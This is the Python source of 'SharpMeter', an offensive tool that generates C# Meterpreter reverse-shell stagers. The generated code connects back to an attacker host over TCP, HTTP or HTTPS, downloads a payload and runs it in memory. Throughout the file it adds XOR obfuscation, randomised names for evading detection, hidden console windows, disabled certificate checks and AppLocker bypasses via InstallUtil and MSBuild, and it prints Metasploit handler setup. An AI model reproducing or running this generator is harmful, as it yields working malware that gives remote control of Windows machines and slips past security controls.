#!/usr/bin/python
# None of this would be possible without the work from @harmj0y and veil-framework
# Also @cneeliz for testing and deugging my shit code.
# This is smokeware, it's like beerware but I don't drink =]
# DONE: add option for command line url, ie CompileMe.exe http://192.168.1.101:443
# DONE: XOR option for tcp
# DONE: shellcode stub input, ie SharpMeter.py embed 0011333377DDEEAADDBBEEAAFF
# DONE: Variable length XOR
# DONE: Add Compression for embed mode -c
# DONE: File support for embed, ie SharpMeter.py embed outfile.cs in.dll
# TODO: Better compression???
# TODO: more options info, ie. cant use (-a with -m) or (-a with -i) etc...
# TODO: info on hosting msbuild files
# TODO: fix the debugging names.
# TODO: HostHeaders/SSL...
# TODO: dll option?
# no bugs reports = awesome, or your lazy...
import random
import sys
import argparse
import binascii
import os.path

# define here, change later
DEBUG = False
XOR_URL = False
VALIDATE_SSL_CERT = False # Try letsencrypt.org and afraid.org!
APP_LOCKER = False
WINDOW_CLOSE = False
MSBUILD = False
INPUT_URL = False # defender?
EMBED = False #silly options
COMPRESS = False

# banner cruft
def opening_banner():
    ret ='''
 ____  _                      __  __      _            
/ ___|| |__   __ _ _ __ _ __ |  \/  | ___| |_ ___ _ __ 
\___ \| '_ \ / _` | '__| '_ \| |\/| |/ _ \ __/ _ \ '__|
 ___) | | | | (_| | |  | |_) | |  | |  __/ ||  __/ |   
|____/|_| |_|\__,_|_|  | .__/|_|  |_|\___|\__\___|_|   
                       |_|              by @vvalien1   
'''
    return ret

def finish_msf():
    ret ="""
[*] On Your Metasploit Host Run:
--------------------------------
use exploit/multi/handler
set payload windows/meterpreter/reverse_{0}
set LHOST 0.0.0.0
set LPORT {1}
set ExitOnSession false
set EnableStageEncoding true
set EnableUnicodeEncoding true
exploit -j
"""
    return ret

def finish_csc():
    ret = """
[*] On Windows To Compile:
--------------------------
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:"{0}.exe" /platform:x86 "{0}.cs"
[*] To Bypass Applocker:
--------------------
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U "{0}.exe"
"""
    return ret

def finish_msbuild():
    ret = """
[*] On Windows To Compile AND Execute:
--------------------------------------
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe {0}.{1}
"""
    return ret

def write_file(fname, data):
    o = open(fname, "w")
    o.write(data)
    o.close()
    
def read_file(fname):
    o = open(fname, "rb")
    r = o.read()
    return r

def rand_str():
    ascii = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    rng = random.randrange(10,15) # you can change this
    ret = ''.join(random.choice(ascii) for x in range(rng))
    return ret

def random_names(mod_name = ""):
    ret = rand_str()
    if DEBUG and mod_name != "": ret = mod_name
    return ret

def xor_to_format_bytes(data_to_xor, byte_name, xor_key):
    out_scode = []
    keycounter = 0 
    for i in range(len(data_to_xor)):
        if keycounter == len(xor_key): keycounter = 0
        out_scode.append(ord(data_to_xor[i]) ^ xor_key[keycounter])
    byte_string = " byte[] %s = {" % byte_name
    for i in range(len(out_scode)):
        byte_string += hex(out_scode[i])
        if i < len(out_scode)-1 : byte_string += ","
    byte_string += "};"
    return byte_string

def bytes_to_csharp(byte_name, bytes):
    ret = " byte[] %s = {" % byte_name
    for i in range(len(bytes)):
        ret += hex(bytes[i])
        if i < len(bytes)-1 : ret += ","
    ret += "};"
    return ret

def xor_multibyte_key(keylen):
    xor_key = []
    for i in range(keylen):
        xor_key.append(random.randrange(0,255))
    return xor_key
        
def xor_multibyte_enc_dec(scode, xor_key):
    ret = []
    a = 0
    for i in range(len(scode)):
        if a == len(xor_key): a = 0
        ret.append(ord(scode[i]) ^ xor_key[a])
        a += 1
    return ret

# xord_bytes = xor_code(binascii.unhexlify(hexbytes), xor_key)

def ms_build_check(pcode, classname):
    if MSBUILD == True:
        targetName = random_names("mytargetName")
        payloadCode = '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
        payloadCode += '<Target Name="%s"> <%s/> </Target>\n' % (targetName, classname)
        # both class names MUST be same, and also same as c# code
        payloadCode += '<UsingTask TaskName="%s" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">\n' % (classname)
        payloadCode += '<Task>\n'
        payloadCode += '<Code Type="Class" Language="cs">\n'
        payloadCode += '<![CDATA[\n'
        payloadCode += 'using Microsoft.Build.Framework; using Microsoft.Build.Utilities; '
        payloadCode += pcode
        payloadCode += ']]>\n</Code>\n</Task>\n</UsingTask>\n</Project>'
        return payloadCode
    else:
        pcode += '}\n' # close the namespace!
        return pcode

        
def compress_class(DecompressClassName):
    DataVar                 = random_names("DataVar")
    ZipStream               = random_names("ZipStream")
    resultStream            = random_names("resultStream")
    BufferVar               = random_names("BufferVar")
    readCounter             = random_names("readCounter")
    ret = "public static byte[] %s(byte[] %s) {\n" % (DecompressClassName, DataVar)
    ret += " using (var %s = new GZipStream(new MemoryStream(%s), CompressionMode.Decompress))\n" % (ZipStream, DataVar)
    ret += " using (var %s = new MemoryStream()) {\n" % (resultStream)
    ret += " var %s = new byte[4096];\n" % (BufferVar)
    ret += " int %s;\n" %(readCounter)
    ret += " while ((%s = %s.Read(%s, 0, %s.Length)) > 0) {\n" % (readCounter, ZipStream, BufferVar, BufferVar)
    ret += "  %s.Write(%s, 0, %s);\n" % (resultStream, BufferVar, readCounter)
    ret += "  }return %s.ToArray();}}\n" % (resultStream)
    return ret

def generate_embed(hexstream):
    xorByteVar            = random_names("xorByteVar")
    # xor_key               = random.randrange(0,255)
    xor_key               = xor_multibyte_key(3) #random.randrange(0,255))
    xor_key_name          = random_names("XOR_KEY")
    namespace             = random_names("NameSpaceName")
    classname             = random_names("ClassName")
    # for xoring the url...
    genxorName            = random_names("GenXorName")
    genxorByteVar         = random_names("GenXorByteVar")
    genxorKeyVar          = random_names("GenXorKeyVar")
    genxorReturnChar      = random_names("GenXorReturnChar")
    ##
    injectName            = random_names("injectName")
    sName          = random_names("sname")
    funcAddrName   = random_names("FunctionAddressName")
    hThreadName    = random_names("HThreadIDName")
    threadIdName   = random_names("ThreadIDName")
    pinfoName      = random_names("pInfoName")
    un_xor_payload         = random_names("un_xor_payload")
    nsName         = random_names("nsName")
    xorDataBytesName       = random_names("xorDataBytes")
    consoleWin = random_names("ConsoleWindowVariable")
    DecompressClassName = random_names("DecompressClassName")
    r = [random_names() for x in xrange(14)]
    
    ########################################################
    ## code starts here
    payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
    if COMPRESS:
        payloadCode += "using System.IO.Compression; using System.IO;\n"
    if APP_LOCKER:
        payloadCode += "namespace %s {" % namespace
        payloadCode += "[System.ComponentModel.RunInstaller(true)]\n"
        payloadCode += "public class InstallUtil : System.Configuration.Install.Installer{\n"
        payloadCode += "public override void Install(System.Collections.IDictionary savedState)\n"
        payloadCode += " {Random %s = new Random((int)DateTime.Now.Ticks);}\n" % random_names("NoFunction")
        payloadCode += "public override void Uninstall(System.Collections.IDictionary savedState) {\n"
        payloadCode += " %s.Main(null);}}\n" % classname
        payloadCode += "class %s {\n" % classname
    elif MSBUILD:
        payloadCode += "public class %s : Task, ITask {\n" % (classname)
    else:
        payloadCode += "namespace %s { class %s {\n" % (namespace, classname)
    # must have xor in here
    if COMPRESS:
        payloadCode += compress_class(DecompressClassName)
    payloadCode += "static byte[] %s(byte[] %s, byte[] %s){\n" % (genxorName, genxorByteVar, genxorKeyVar)
    payloadCode += " byte[] %s = new byte[%s.Length];\n" % (genxorReturnChar, genxorByteVar)
    payloadCode += " int v = 0;"
    payloadCode += " for (int i=0; i < %s.Length; i++) {\n" % (genxorByteVar)
    payloadCode += " if (v == %s.Length) { v = 0; } %s[i] = (byte)(%s[i] ^ %s[v]); }\n" % (genxorKeyVar, genxorReturnChar, genxorByteVar, genxorKeyVar)
    payloadCode += " return %s;}\n" % (genxorReturnChar)
    payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
    payloadCode += " if (%s != null) {\n" %(sName)
    payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
    payloadCode += " Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
    payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
    payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
    payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
    if MSBUILD:
        payloadCode += "public override bool Execute() {\n"
    else:
        payloadCode += "public static void Main(string[] args){\n"
    if WINDOW_CLOSE == True:
        payloadCode += " IntPtr %s = GetConsoleWindow();\nShowWindow(%s, 0);\n " %(consoleWin, consoleWin)
    payloadCode += xor_to_format_bytes(hexstream, xorDataBytesName, xor_key)
    payloadCode += "\n"
    payloadCode += bytes_to_csharp(xor_key_name, xor_key)
    payloadCode += "\n byte[] %s = %s(%s, %s);\n" % (un_xor_payload, genxorName, xorDataBytesName, xor_key_name)
    if COMPRESS:
        payloadCode += " %s = %s(%s);\n" % (un_xor_payload, DecompressClassName, un_xor_payload)
    payloadCode += " %s(%s);" % (injectName, un_xor_payload)
    if MSBUILD:
        payloadCode += "return true;"
    payloadCode += "}\n"
    payloadCode += """[DllImport(\"kernel32\")] private static extern IntPtr GetConsoleWindow();\n[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr %s, int %s);\n[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11],r[12],r[13])
    payloadCode = ms_build_check(payloadCode, classname)
    return payloadCode
    ##??

def generate_http_https(LHOST, LPORT, SSL):
    thexorKey = []
    thexorKey.append(random.randrange(0, 255))
    # you should never have to worry about this, its mostly for debugging anyways
    namespace             = random_names("NameSpaceName")
    classname             = random_names("ClassName")
    randomStringName      = random_names("RandomStringName")
    bufferName            = random_names("BufferName")
    charsName             = random_names("CharsName")
    t = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
    random.shuffle(t)
    chars = ''.join(t)
    checksum8Name = random_names("CheckSum8")
    # code for the genHTTPChecksum() function
    genHTTPChecksumName   = random_names("GenerateHTTPChecksum")
    baseStringName        = random_names("BaseStringName")
    randCharsName         = random_names("RandomCharsName")
    urlName               = random_names("URLName")
    randomReturn          = random_names("randomReturnName")
    random.shuffle(t)
    randChars = ''.join(t)
    # for xoring the url...
    genxorName            = random_names("GenXorName")
    genxorByteVar         = random_names("GenXorByteVar")
    genxorKeyVar          = random_names("GenXorKeyVar")
    genxorReturnChar      = random_names("GenXorReturnChar")
    # code for getData() function
    getDataName           = random_names("GetDataName")
    strName               = random_names("StringName")
    webClientName         = random_names("WebClientName")
    sName                 = random_names("sName")
    # code for the inject() function
    injectName            = random_names("injectName")
    sName2                = random_names("SecondSName")
    funcAddrName          = random_names("FunctionAddressName")
    hThreadName           = random_names("hThreadName")
    threadIdName          = random_names("tThreadName")
    pinfoName             = random_names("pInfoName")
    urlStringName         = random_names("UrlStringName")
    xorUrlBytesName       = random_names("xorUrlBytes")
    # code for Main() to launch everything
    sName3                = random_names("sName3")
    randomName            = random_names("RandomName")
    consoleWin            = random_names("ConsoleWindowVariable")
    r = [random_names() for x in xrange(14)]
    
    payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
    if APP_LOCKER:
        payloadCode += "namespace %s {" % namespace
        payloadCode += "[System.ComponentModel.RunInstaller(true)]\n"
        payloadCode += "public class InstallUtil : System.Configuration.Install.Installer{\n"
        payloadCode += "public override void Install(System.Collections.IDictionary savedState)\n"
        payloadCode += " {Random %s = new Random((int)DateTime.Now.Ticks);}\n" % random_names("NoFunction")
        payloadCode += "public override void Uninstall(System.Collections.IDictionary savedState){%s.Main(null);}}\n" % (classname)
        payloadCode += "class %s {\n" % classname
    elif MSBUILD:
        payloadCode += "public class %s : Task, ITask {\n" % (classname)
    else:
        payloadCode += "namespace %s { class %s {\n" % (namespace, classname)

    if SSL and not VALIDATE_SSL_CERT:
        # logic to turn off certificate validation
        validateServerCertficateName = random_names("validateServerCertficateName")
        payloadCode += "private static bool %s(object sender, System.Security.Cryptography.X509Certificates.X509Certificate cert,System.Security.Cryptography.X509Certificates.X509Chain chain,System.Net.Security.SslPolicyErrors sslPolicyErrors) { return true; }\n" %(validateServerCertficateName)
    payloadCode += "static string %s(Random r, int s) {\n" % (randomStringName)
    payloadCode += " char[] %s = new char[s];\n" % (bufferName)
    payloadCode += " string %s = \"%s\";\n" % (charsName, chars)
    payloadCode += " for (int i = 0; i < s; i++){ %s[i] = %s[r.Next(%s.Length)];}\n" % (bufferName, charsName, charsName)
    payloadCode += " return new string(%s);}\n" % (bufferName)
    payloadCode += "static bool %s(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) %% 0x100 == 92);}\n" %(checksum8Name)

    payloadCode += "static string %s(Random r) {\n string %s = \"\";\n" % (genHTTPChecksumName,baseStringName)
    payloadCode += " for (int i = 0; i < 64; ++i) { %s = %s(r, 3);\n" % (baseStringName,randomStringName)
    payloadCode += " string %s = new string(\"%s\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n" %(randCharsName,randChars)
    payloadCode += " for (int j = 0; j < %s.Length; ++j) {\n" % (randCharsName)
    payloadCode += " string %s = %s + %s[j];\n" % (urlName,baseStringName,randCharsName)
    payloadCode += " if (%s(%s)) {return %s;}}}\n return \"%s\";}\n" % (checksum8Name,urlName, urlName, randomReturn) # what was this for???
    if XOR_URL:
        payloadCode += "static string %s(byte[] %s, byte %s){\n" % (genxorName, genxorByteVar, genxorKeyVar)
        payloadCode += " char[] %s = new char[%s.Length];\n" % (genxorReturnChar, genxorByteVar)
        payloadCode += " for (int i=0; i < %s.Length; i++) { %s[i] = (char)(%s[i] ^ %s); }\n" % (genxorByteVar, genxorReturnChar, genxorByteVar, genxorKeyVar)
        payloadCode += " return new string(%s);}\n" % genxorReturnChar
    payloadCode += "static byte[] %s(string %s) {\n" %(getDataName,strName)
    if SSL and not VALIDATE_SSL_CERT:
        payloadCode += " ServicePointManager.ServerCertificateValidationCallback = %s;\n" % (validateServerCertficateName)
    payloadCode += " WebClient %s = new System.Net.WebClient();\n" % (webClientName)
    payloadCode += " %s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
    payloadCode += " %s.Headers.Add(\"Accept\", \"*/*\");\n" % (webClientName)
    payloadCode += " %s.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n" % (webClientName)
    payloadCode += " %s.Headers.Add(\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\");\n" % (webClientName)
    payloadCode += " byte[] %s = null;\n" % (sName)
    payloadCode += " try { %s = %s.DownloadData(%s);\n" % (sName, webClientName, strName)
    payloadCode += " if (%s.Length < 100000) return null;}\n" % (sName)
    payloadCode += " catch (WebException) {}\n"
    payloadCode += " return %s;}\n" % (sName)
    payloadCode += "static void %s(byte[] %s) {\n" % (injectName, sName2)
    payloadCode += " if (%s != null) {\n" % (sName2)
    payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName2)
    payloadCode += " Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName2,funcAddrName, sName2)
    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
    payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
    payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
    payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)

    if MSBUILD:
        payloadCode += "public override bool Execute() {\n"
    else:
        payloadCode += "public static void Main(string[] args){\n"
    if WINDOW_CLOSE == True:
        payloadCode += " IntPtr %s = GetConsoleWindow();\nShowWindow(%s, 0);\n " %(consoleWin, consoleWin)
    payloadCode += " Random %s = new Random((int)DateTime.Now.Ticks);\n" %(randomName)
    # using ssl or not?
    urlFormat = "http"
    if SSL: urlFormat = "https"
    if XOR_URL:
        our_url = "%s://%s:%s/" % (urlFormat, LHOST,LPORT)
        payloadCode += xor_to_format_bytes(our_url, xorUrlBytesName, thexorKey)
        payloadCode += "\n string %s = %s(%s, %s);\n" % (urlStringName, genxorName, xorUrlBytesName, thexorKey[0])
        if INPUT_URL:
            payloadCode += " if (args.Length != 0) { %s = args[0]; }\n" % (urlStringName)
        payloadCode += " byte[] %s = %s( %s + %s(%s));\n" %(sName3, getDataName, urlStringName, genHTTPChecksumName,randomName)
        payloadCode += " %s(%s);" %(injectName, sName3)
    else:
        payloadCode += " string %s = \"%s://%s:%s/\";\n" % (urlStringName, urlFormat, LHOST,LPORT)
        if INPUT_URL:
            payloadCode += " if (args.Length != 0) { %s = args[0]; }\n" % (urlStringName)
        payloadCode += " byte[] %s = %s(%s + %s(%s));\n" %(sName3, getDataName, urlStringName, genHTTPChecksumName,randomName)    
        payloadCode += " %s(%s);" %(injectName, sName3)
    if MSBUILD:
        payloadCode += " return true;"
    payloadCode += "}\n"
    payloadCode += """[DllImport(\"kernel32\")] private static extern IntPtr GetConsoleWindow();\n[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr %s, int %s);\n[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } \n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11],r[12],r[13])
    payloadCode = ms_build_check(payloadCode, classname)
    return payloadCode

def generate_tcp(LHOST, LPORT):
    thexorKey = []
    thexorKey.append(random.randrange(0,255))
    # Get random names, also for debugging (you never know!)
    getDataName    = random_names("GetData")
    injectName     = random_names("InjectName")
    namespace      = random_names("NameSpaceName")
    classname      = random_names("ClassName")
    hostName       = random_names("HostName")
    portName       = random_names("PortName")
    ipName         = random_names("IPName")
    sockName       = random_names("SockName")
    length_rawName = random_names("RawLengthName")
    lengthName     = random_names("LengthName")
    sName          = random_names("sName")
    total_bytesName = random_names("TotalBytesName")
    handleName     = random_names("HandleName")
    sName          = random_names("newSname")
    funcAddrName   = random_names("FunctionAddressName")
    hThreadName    = random_names("HThreadIDName")
    threadIdName   = random_names("ThreadIDName")
    pinfoName      = random_names("pInfoName")
    urlVar         = random_names("urlVar")
    nsName         = random_names("nsName")
        # for xoring the url...
    genxorName            = random_names("GenXorName")
    genxorByteVar         = random_names("GenXorByteVar")
    genxorKeyVar          = random_names("GenXorKeyVar")
    genxorReturnChar      = random_names("GenXorReturnChar")
    xorUrlBytesName       = random_names("xorUrlBytes")
    r = [random_names() for x in xrange(14)]
    
    # imports
    payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"

    #incase we want applocker
    if APP_LOCKER:
        payloadCode += "namespace %s {" % namespace
        payloadCode += "[System.ComponentModel.RunInstaller(true)]\n"
        payloadCode += "public class InstallUtil : System.Configuration.Install.Installer{\n"
        payloadCode += "public override void Install(System.Collections.IDictionary savedState)\n"
        payloadCode += "{Random %s = new Random((int)DateTime.Now.Ticks);}\n" % random_names("NoFunction")
        payloadCode += "public override void Uninstall(System.Collections.IDictionary savedState){%s.Main(null);}}\n" % classname
        payloadCode += "class %s {\n" % classname
    # for msbuild we cant use a namespace
    elif MSBUILD:
        payloadCode += "public class %s : Task, ITask {\n" % (classname)
    # normal payload
    else:
        payloadCode += "namespace %s { class %s {\n" % (namespace, classname)
    if XOR_URL:
        payloadCode += "static string %s(byte[] %s, byte %s){\n" % (genxorName, genxorByteVar, genxorKeyVar)
        payloadCode += " char[] %s = new char[%s.Length];\n" % (genxorReturnChar, genxorByteVar)
        payloadCode += " for (int i=0; i < %s.Length; i++) { %s[i] = (char)(%s[i] ^ %s); }\n" % (genxorByteVar, genxorReturnChar, genxorByteVar, genxorKeyVar)
        payloadCode += " return new string(%s);}\n" % genxorReturnChar
    payloadCode += "static byte[] %s(string %s) {\n" %(getDataName, hostName)
    payloadCode += " IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s.Split(':')[0]), Int32.Parse(%s.Split(':')[1]));\n" %(ipName, hostName, hostName)
    payloadCode += " Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
    payloadCode += " try { %s.Connect(%s); }\n" %(sockName, ipName)
    payloadCode += " catch { return null;}\n"
    payloadCode += " byte[] %s = new byte[4];\n" %(length_rawName)
    payloadCode += " %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
    payloadCode += " int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
    payloadCode += " byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
    payloadCode += " int %s = 0;\n" %(total_bytesName)
    payloadCode += " while (%s < %s)\n" %(total_bytesName, lengthName)
    payloadCode += " { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
    payloadCode += " byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
    payloadCode += " Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
    payloadCode += " return %s;}\n" %(sName)
    payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
    payloadCode += " if (%s != null) {\n" %(sName)
    payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
    payloadCode += " Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
    payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
    payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
    payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
    
    consoleWin = random_names("ConsoleWindowVariable")
    # to override execute we must use bool
    if MSBUILD:
        payloadCode += "public override bool Execute() {\n"
    else:
        payloadCode += "public static void Main(string[] args){\n"
    # you might not want windows close, depends
    if WINDOW_CLOSE:
        payloadCode += "IntPtr %s = GetConsoleWindow();\nShowWindow(%s, 0);\n" %(consoleWin, consoleWin)
    if XOR_URL:
        our_url = "%s:%s" % (LHOST,LPORT)
        payloadCode += xor_to_format_bytes(our_url, xorUrlBytesName, thexorKey)
        payloadCode += "\n string %s = %s(%s, %s);\n" % (urlVar, genxorName, xorUrlBytesName, thexorKey[0])
    else:
        payloadCode += " string %s = \"%s:%s\";\n"  % (urlVar, LHOST,LPORT)
    if INPUT_URL:
        payloadCode += " if (args.Length != 0) { %s = args[0]; }\n" % (urlVar)
    payloadCode += " byte[] %s = null;\n %s = %s(%s);\n" %(nsName, nsName, getDataName,urlVar)
    payloadCode += " %s(%s);" %(injectName, nsName)
    # return since bool
    if MSBUILD:
        payloadCode += "return true;"
    payloadCode += "}\n"
    payloadCode += """[DllImport(\"kernel32\")] private static extern IntPtr GetConsoleWindow();\n[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr %s, int %s);\n[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11],r[12],r[13])
    payloadCode = ms_build_check(payloadCode, classname)
    return payloadCode

if __name__ == '__main__':
    # not a fan of argparse, so im using both
    # personally I think it looks much better
    print(opening_banner())
    print("A Simple Way To Make Meterpreter Reverse Payloads\n")
    usage_text = "%s LHOST LPORT CompileMe.cs <tcp/http/https>\n" % (sys.argv[0])
    usage_text += "usage: %s embed CompileMe.cs 001133337700" % (sys.argv[0])
    parser = argparse.ArgumentParser(usage=usage_text)
    # cannot use (-a with -m)
    parser.add_argument('-w', action='store_true', default=False, dest='window', help='AutoClose Console Window')
    parser.add_argument('-a', action='store_true', default=False, dest='app', help='Applocker Bypass')
    parser.add_argument('-x', action='store_true', default=False, dest='xor', help='XOR the URL')
    parser.add_argument('-m', action='store_true', default=False, dest='mbuild', help='MSBuild File!')
    parser.add_argument('-c', action='store_true', default=False, dest='compress', help='Compression')
    parser.add_argument('-i', action='store_true', default=False, dest='inn', help='Allow Input URL')
    parser.add_argument('-d', action='store_true', default=False, dest='debug', help='Debuging')
    # it gets silly here because i changed tho arg pattern
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)
    elif (sys.argv[1] == "embed"):
        nargs              = parser.parse_args(sys.argv[4:])
        reverse_method     = sys.argv[1]
        output_file        = sys.argv[2]
        shellcode          = sys.argv[3]
        WINDOW_CLOSE       = nargs.window
        XOR_URL            = nargs.xor
        APP_LOCKER         = nargs.app
        MSBUILD            = nargs.mbuild
        INPUT_URL          = nargs.inn
        DEBUG              = nargs.debug
        EMBED = True
        COMPRESS           = nargs.compress
        if os.path.isfile(shellcode):
            shellcode = read_file(shellcode)
            reverse_method = "embed_file"
    elif len(sys.argv) < 5:
        parser.print_help()
        sys.exit(0)
    else:
        nargs              = parser.parse_args(sys.argv[5:])
        LHOST              = sys.argv[1]
        LPORT              = int(sys.argv[2])
        output_file        = sys.argv[3]
        reverse_method     = sys.argv[4]
        WINDOW_CLOSE       = nargs.window
        XOR_URL            = nargs.xor
        APP_LOCKER         = nargs.app
        MSBUILD            = nargs.mbuild
        INPUT_URL          = nargs.inn
        DEBUG              = nargs.debug
    if reverse_method == "embed":
        payload = generate_embed(binascii.unhexlify(shellcode))
        write_file(output_file, payload)
    elif reverse_method == "embed_file":
        if COMPRESS:
            import StringIO
            import gzip
            out = StringIO.StringIO()
            with gzip.GzipFile(fileobj=out, mode="w") as f:
                f.write(shellcode)
            shellcode = out.getvalue()
        payload = generate_embed(shellcode)
        write_file(output_file, payload)
    elif reverse_method == "tcp":
        payload = generate_tcp(LHOST,LPORT)
        write_file(output_file, payload)
    elif reverse_method == "http":
        payload = generate_http_https(LHOST, LPORT, False)
        write_file(output_file, payload)
    elif reverse_method == "https":
        payload = generate_http_https(LHOST, LPORT, True)
        write_file(output_file, payload)
    else:
        print("Please choose a valid connectback or embed method!")
        print("I.E. tcp, http, or https \n")
        sys.exit(0)
    if EMBED:
        if MSBUILD:
            closing = finish_msbuild().format(output_file.split('.')[0], output_file.split('.')[1])
        else:
            closing = finish_csc().format(output_file.split('.')[0])
    elif MSBUILD:
        closing = finish_msf().format(reverse_method, LPORT)
        closing += finish_msbuild().format(output_file.split('.')[0], output_file.split('.')[1])
    else:
        closing = finish_msf().format(reverse_method, LPORT)
        closing += finish_csc().format(output_file.split('.')[0])
    print(closing)
